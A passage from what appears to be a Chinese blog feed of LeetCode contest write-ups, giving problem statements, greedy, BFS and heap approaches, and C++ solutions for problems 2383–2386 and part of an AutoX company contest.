<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minNumberOfHours</span><span class="params">(<span class="type">int</span> initialEnergy, <span class="type">int</span> initialExperience, vector&lt;<span class="type">int</span>&gt;&amp; energy, vector&lt;<span class="type">int</span>&gt;&amp; experience)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = energy.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (energy[i] &gt;= initialEnergy) &#123;</span><br><span class="line">                <span class="type">int</span> add = energy[i] - initialEnergy + <span class="number">1</span>;</span><br><span class="line">                initialEnergy += add;</span><br><span class="line">                tot += add;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (experience[i] &gt;= initialExperience) &#123;</span><br><span class="line">                <span class="type">int</span> add = experience[i] - initialExperience + <span class="number">1</span>;</span><br><span class="line">                initialExperience += add;</span><br><span class="line">                tot += add;</span><br><span class="line">            &#125;</span><br><span class="line">            initialEnergy -= energy[i];</span><br><span class="line">            initialExperience += experience[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> tot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2384-最大回文数字"><a href="#2384-最大回文数字" class="headerlink" title="2384. 最大回文数字"></a>2384. 最大回文数字</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个仅由数字（<code>0 - 9</code>）组成的字符串 <code>num</code> 。</p>
<p>请你找出能够使用 <code>num</code> 中数字形成的 <strong>最大回文</strong> 整数，并以字符串形式返回。该整数不含 <strong>前导零</strong> 。</p>
<p><strong>注意：</strong></p>
<ul>
<li>你 <strong>无需</strong> 使用 <code>num</code> 中的所有数字，但你必须使用 <strong>至少</strong> 一个数字。</li>
<li>数字可以重新排序。</li>
</ul>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = &quot;444947137&quot;</span><br><span class="line">输出：&quot;7449447&quot;</span><br><span class="line">解释：</span><br><span class="line">从 &quot;444947137&quot; 中选用数字 &quot;4449477&quot;，可以形成回文整数 &quot;7449447&quot; 。</span><br><span class="line">可以证明 &quot;7449447&quot; 是能够形成的最大回文整数。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = &quot;00009&quot;</span><br><span class="line">输出：&quot;9&quot;</span><br><span class="line">解释：</span><br><span class="line">可以证明 &quot;9&quot; 能够形成的最大回文整数。</span><br><span class="line">注意返回的整数不应含前导零。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= num.length &lt;= 105</code></li>
<li><code>num</code> 由数字（<code>0 - 9</code>）组成</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-307/problems/largest-palindromic-number/">https://leetcode.cn/contest/weekly-contest-307/problems/largest-palindromic-number/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心法
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单的贪心法即可，回文数分为左右两部分，我们贪心的选择左边的最大部分即可，按照最大的数字尽可能的往左半边放置的原则，优先从 $9$ 开始进行选择直到 $1$ 为止。右边的回文部分则是左边的镜像。此时需要注意的时我们还需要选择回文数的中间那个数字也是按照贪心的原则去选择即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n + |\Sigma|)$，$n$ 表示字符串的长度，$|\Sigma|$ 表示字符集。</li>
<li>空间复杂度：时间复杂度为 $O(n)$，$n$ 表示字符串的长度。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">largestPalindromic</span><span class="params">(string num)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">        string ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : num) &#123;</span><br><span class="line">            cnt[c - <span class="string">&#x27;0&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        string prefix;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">9</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> tot = cnt[i] / <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; tot; j++) &#123;</span><br><span class="line">                    prefix.<span class="built_in">push_back</span>(i + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                cnt[i] = cnt[i] % <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        string suffix = prefix;</span><br><span class="line">        <span class="built_in">reverse</span>(suffix.<span class="built_in">begin</span>(), suffix.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">9</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">char</span> c = i + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(prefix.<span class="built_in">size</span>() &gt; <span class="number">0</span> &amp;&amp; prefix[<span class="number">0</span>] != <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> prefix + <span class="built_in">string</span>(<span class="number">1</span>, c) + suffix;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">string</span>(<span class="number">1</span>, c);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (prefix.<span class="built_in">size</span>() &gt; <span class="number">0</span> &amp;&amp; prefix[<span class="number">0</span>] != <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> prefix + suffix;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2385-感染二叉树需要的总时间"><a href="#2385-感染二叉树需要的总时间" class="headerlink" title="2385. 感染二叉树需要的总时间"></a>2385. 感染二叉树需要的总时间</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一棵二叉树的根节点 <code>root</code> ，二叉树中节点的值 <strong>互不相同</strong> 。另给你一个整数 <code>start</code> 。在第 <code>0</code> 分钟，<strong>感染</strong> 将会从值为 <code>start</code> 的节点开始爆发。</p>
<p>每分钟，如果节点满足以下全部条件，就会被感染：</p>
<ul>
<li>节点此前还没有感染。</li>
<li>节点与一个已感染节点相邻。</li>
</ul>
<p>返回感染整棵树需要的分钟数<em>。</em></p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/06/25/image-20220625231744-1.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,5,3,null,4,10,6,9,2], start = 3</span><br><span class="line">输出：4</span><br><span class="line">解释：节点按以下过程被感染：</span><br><span class="line">- 第 0 分钟：节点 3</span><br><span class="line">- 第 1 分钟：节点 1、10、6</span><br><span class="line">- 第 2 分钟：节点5</span><br><span class="line">- 第 3 分钟：节点 4</span><br><span class="line">- 第 4 分钟：节点 9 和 2</span><br><span class="line">感染整棵树需要 4 分钟，所以返回 4 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/06/25/image-20220625231812-2.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1], start = 1</span><br><span class="line">输出：0</span><br><span class="line">解释：第 0 分钟，树中唯一一个节点处于感染状态，返回 0 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li>树中节点的数目在范围 <code>[1, 105]</code> 内</li>
<li><code>1 &lt;= Node.val &lt;= 105</code></li>
<li>每个节点的值 <strong>互不相同</strong></li>
<li>树中必定存在值为 <code>start</code> 的节点</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/amount-of-time-for-binary-tree-to-be-infected/">https://leetcode.cn/problems/amount-of-time-for-binary-tree-to-be-infected/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>BFS
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目本身比较简单了，最大的问题是我们无法从孩子节点访问父节点，此时我们只需要重新建树，使得孩子节点可以访问父亲节点即可，那么就转换为普通题目了，按照标准的 $BFS$ 模板遍历即可。</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 为节点数目。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，$n$ 为节点数目。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">MyTreeNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    MyTreeNode *left;</span><br><span class="line">    MyTreeNode *right;</span><br><span class="line">    MyTreeNode *parent;</span><br><span class="line">    <span class="built_in">MyTreeNode</span>() : <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">left</span>(<span class="literal">nullptr</span>), <span class="built_in">right</span>(<span class="literal">nullptr</span>), <span class="built_in">parent</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">MyTreeNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">left</span>(<span class="literal">nullptr</span>), <span class="built_in">right</span>(<span class="literal">nullptr</span>), <span class="built_in">parent</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">MyTreeNode</span>(<span class="type">int</span> x, MyTreeNode *left, MyTreeNode *right, MyTreeNode *parent) : <span class="built_in">val</span>(x), <span class="built_in">left</span>(left), <span class="built_in">right</span>(right),<span class="built_in">parent</span>(parent) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">amountOfTime</span><span class="params">(TreeNode* root, <span class="type">int</span> start)</span> </span>&#123;</span><br><span class="line">        MyTreeNode *myRoot = <span class="keyword">new</span> <span class="built_in">MyTreeNode</span>();</span><br><span class="line">        MyTreeNode *target = <span class="literal">nullptr</span>;</span><br><span class="line">        queue&lt;pair&lt;TreeNode *, MyTreeNode *&gt;&gt; qu;</span><br><span class="line">        qu.<span class="built_in">emplace</span>(root, myRoot);</span><br><span class="line">        <span class="keyword">while</span>(!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [node, myNode] = qu.<span class="built_in">front</span>();</span><br><span class="line">            qu.<span class="built_in">pop</span>();</span><br><span class="line">            myNode-&gt;val = node-&gt;val;</span><br><span class="line">            <span class="keyword">if</span>(myNode-&gt;val == start) &#123;</span><br><span class="line">                target = myNode;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;left) &#123;</span><br><span class="line">                myNode-&gt;left = <span class="keyword">new</span> <span class="built_in">MyTreeNode</span>();</span><br><span class="line">                myNode-&gt;left-&gt;val = node-&gt;left-&gt;val;</span><br><span class="line">                myNode-&gt;left-&gt;parent = myNode;</span><br><span class="line">                qu.<span class="built_in">emplace</span>(node-&gt;left, myNode-&gt;left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;right) &#123;</span><br><span class="line">                myNode-&gt;right = <span class="keyword">new</span> <span class="built_in">MyTreeNode</span>();</span><br><span class="line">                myNode-&gt;right-&gt;val = node-&gt;right-&gt;val;</span><br><span class="line">                myNode-&gt;right-&gt;parent = myNode;</span><br><span class="line">                qu.<span class="built_in">emplace</span>(node-&gt;right, myNode-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        queue&lt;MyTreeNode *&gt; Q;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; visit;</span><br><span class="line">        Q.<span class="built_in">emplace</span>(target);</span><br><span class="line">        visit.<span class="built_in">emplace</span>(target-&gt;val);</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(!Q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> sz = Q.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; sz; i++) &#123;</span><br><span class="line">                <span class="keyword">auto</span> curr = Q.<span class="built_in">front</span>();</span><br><span class="line">                Q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (curr-&gt;left &amp;&amp; !visit.<span class="built_in">count</span>(curr-&gt;left-&gt;val)) &#123;</span><br><span class="line">                    visit.<span class="built_in">emplace</span>(curr-&gt;left-&gt;val);</span><br><span class="line">                    Q.<span class="built_in">emplace</span>(curr-&gt;left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (curr-&gt;right &amp;&amp; !visit.<span class="built_in">count</span>(curr-&gt;right-&gt;val)) &#123;</span><br><span class="line">                    visit.<span class="built_in">emplace</span>(curr-&gt;right-&gt;val);</span><br><span class="line">                    Q.<span class="built_in">emplace</span>(curr-&gt;right);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (curr-&gt;parent &amp;&amp; !visit.<span class="built_in">count</span>(curr-&gt;parent-&gt;val)) &#123;</span><br><span class="line">                    visit.<span class="built_in">emplace</span>(curr-&gt;parent-&gt;val);</span><br><span class="line">                    Q.<span class="built_in">emplace</span>(curr-&gt;parent);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h3 id="2386-找出数组的第-K-大和"><a href="#2386-找出数组的第-K-大和" class="headerlink" title="2386. 找出数组的第 K 大和"></a>2386. 找出数组的第 K 大和</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数数组 <code>nums</code> 和一个 <strong>正</strong> 整数 <code>k</code> 。你可以选择数组的任一 <strong>子序列</strong> 并且对其全部元素求和。</p>
<p>数组的 <strong>第 k 大和</strong> 定义为：可以获得的第 <code>k</code> 个 <strong>最大</strong> 子序列和（子序列和允许出现重复）</p>
<p>返回数组的 <strong>第 k 大和</strong> 。</p>
<p>子序列是一个可以由其他数组删除某些或不删除元素排生而来的数组，且派生过程不改变剩余元素的顺序。</p>
<p><strong>注意：</strong>空子序列的和视作 <code>0</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,4,-2], k = 5</span><br><span class="line">输出：2</span><br><span class="line">解释：所有可能获得的子序列和列出如下，按递减顺序排列：</span><br><span class="line">- 6、4、4、2、2、0、0、-2</span><br><span class="line">数组的第 5 大和是 2 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,-2,3,4,-10,12], k = 16</span><br><span class="line">输出：10</span><br><span class="line">解释：数组的第 16 大和是 10 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>n == nums.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>-109 &lt;= nums[i] &lt;= 109</code></li>
<li><code>1 &lt;= k &lt;= min(2000, 2n)</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/ubiquant2022/problems/I3Gm2h/">https://leetcode.cn/contest/ubiquant2022/problems/I3Gm2h/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>堆
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目确实比较难的题目，但是还是非常好且值得思考的题目。确实不是容易理解的一个题目。需要需要注意的是从数组 $[1,2,3,4,5]$ 中找到前 $k$ 项的子序列最小和来寻找思路：</li>
</ol>
<ul>
<li>我们知道最小的序列肯定是 $[1]$, 此时 $[1]$ 之后我们的待选序列为$[1,2], [2]$，选择下一个元素后要么保留前一个元素，要么不保留前一个元素。这个是解题的关键思路。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \times \log n + k \times \log k)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(k)$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><ul>
<li>堆<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">kSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (num &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                sum += num;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                num = -num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt;&gt; pq;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        pq.<span class="built_in">emplace</span>(sum, <span class="number">0</span>);</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [curr, len] = pq.<span class="built_in">top</span>();</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">            ans = curr;</span><br><span class="line">            <span class="keyword">if</span> (len &lt; nums.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                pq.<span class="built_in">emplace</span>(curr - nums[len], len + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    pq.<span class="built_in">emplace</span>(curr - nums[len] + nums[len - <span class="number">1</span>], len + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            k--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>AutoX 安途智行专场竞赛</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/30/</url>
    <content><![CDATA[<h2 id="AutoX-安途智行专场竞赛"><a href="#AutoX-安途智行专场竞赛" class="headerlink" title="AutoX 安途智行专场竞赛"></a>AutoX 安途智行专场竞赛</h2><p>几场企业的题目质量都还挺高，比周赛题目好多了，今天周赛又是手速场。题目也有意思多了，建议多来点这样的题目。</p>
<h4 id="AutoX-1-网页瀑布流"><a href="#AutoX-1-网页瀑布流" class="headerlink" title="AutoX-1. 网页瀑布流"></a>AutoX-1. 网页瀑布流</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>网页布局中有一种瀑布流布局方式，表现为参差不齐的多栏布局。随着页面滚动条向下，还会不断加载数据块并附加至当前尾部。页面在加载时遵循以下规则：</p>
<ul>
<li>当有数据块需要加载时，优先加载在高度最短的那一列；</li>
<li>若存在多个高度相同且最短的情况，则加载在其中最靠左的那一列</li>
</ul>
<p>已知当前网页共分割为 <code>num</code> 列，该网页有若干数据块可以加载，<code>block[i]</code> 表示第 <code>i</code> 个数据块的高度。当页面按顺序加载完所有的数据块后，请返回高度最大的那一列的高度。</p>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<code>num = 3, block = [5,9,8,6]</code></p>
<p>输出：<code>11</code></p>
<p>解释：如下图所示，返回 11<br><img src="https://pic.leetcode-cn.com/1646291905-AqDTIl-image.png" alt="image.png"></p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<code>num = 2, block = [9,1,1,1,1,1]</code></p>
<p>输出：<code>9</code></p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>0 &lt; num &lt;= 100</code></li>
<li><code>0 &lt; block.length &lt;= 10^4</code></li>
<li><code>0 &lt; block[i] &lt;= 10^3</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/autox2023/problems/l9HbCJ/">https://leetcode.cn/contest/autox2023/problems/l9HbCJ/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>堆
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>可以算是简单题目了，一旦堆中的元素的数目达到 $nums$ 个，则此时我们每次从堆中取出最小元素与当前元素相加之后再放回堆中，让堆中的元素的数目始终保持在 $nums$ 个，最后求出堆中最大的元素即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log k)$，其中 $n$ 表示数组的长度, $k$ 为题目指定的大小。</li>
<li>空间复杂度：$O(k)$。$k$ 为题目指定的大小。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getLengthOfWaterfallFlow</span><span class="params">(<span class="type">int</span> num, vector&lt;<span class="type">int</span>&gt;&amp; block)</span> </span>&#123;</span><br><span class="line">        priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; pq;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : block) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pq.<span class="built_in">size</span>() &lt; num) &#123;</span><br><span class="line">                pq.<span class="built_in">emplace</span>(v);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> curr = pq.<span class="built_in">top</span>();</span><br><span class="line">                pq.<span class="built_in">pop</span>();</span><br><span class="line">                pq.<span class="built_in">emplace</span>(curr + v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!pq.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, pq.<span class="built_in">top</span>());</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="AutoX-2-蚂蚁王国的蜂蜜"><a href="#AutoX-2-蚂蚁王国的蜂蜜" class="headerlink" title="AutoX-2. 蚂蚁王国的蜂蜜"></a>AutoX-2. 蚂蚁王国的蜂蜜</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>蚂蚁王国的蜂蜜专家旺财最近在研究蜂蜜的价格，为了估算出真实的蜂蜜价格，旺财以所有用<strong>有效</strong>报价的<strong>平均值</strong>作为蜂蜜<strong>均价</strong>，稳定的报价往往方差也比较小。因为情报具有时效性，所以每隔一段时间，旺财也会删除一些老旧报价。<br>因为计算平均值和方差对于蚂蚁是一个困难的问题，所以旺财希望你帮他设计一个系统，<code>handle[i] = [type] 或 [type, value]</code> 表示对于旺财的第 <code>i</code> 次的操作有：</p>
<ul>
<li>若 <code>type</code> 为 <code>1</code>，表示获取了一份价格为 <code>value</code> 的报价</li>
<li>若 <code>type</code> 为 <code>2</code>，表示删除了<strong>一个</strong>价格为 <code>value</code> 的报价</li>
<li>若 <code>type</code> 为 <code>3</code>，表示计算当前蜂蜜的<strong>均价</strong>；若当前不存在任何有效报价，返回 <code>-1</code></li>
<li>若 <code>type</code> 为 <code>4</code>，表示计算当前价格的<strong>方差</strong>；若当前不存在任何有效报价，返回 <code>-1</code></li>
</ul>
<p>请按操作的顺序，依次返回所有计算<strong>均价</strong>和<strong>方差</strong>的结果。</p>
<p><strong>提示：</strong></p>
<ul>
<li>用例保证所有删除的报价都是有效的。</li>
</ul>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<code>handle = [[1,1],[1,2],[1,3],[1,2],[3],[4],[2,1],[2,2],[2,3],[3],[4]]</code></p>
<p>输出：<code>[2.00000,0.50000,2.00000,0.00000]</code></p>
<p>解释：如下表所示<br><img src="https://pic.leetcode-cn.com/1661494523-TdCknF-image.png" alt="image.png"></p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<code>handle = [[3],[1,10],[1,0],[3],[4],[2,10],[3]]</code></p>
<p>输出：<code>[-1.00000,5.00000,25.00000,0.00000]</code></p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>0 &lt;= handle.length &lt;=10^5</code></li>
<li><code>0 &lt;= handle[i][1] &lt;= 100</code></li>
<li><code>handle[i][0]</code> 仅包含 <code>1,2,3,4</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/autox2023/problems/8p6t8R/">https://leetcode.cn/contest/autox2023/problems/8p6t8R/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>数学
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
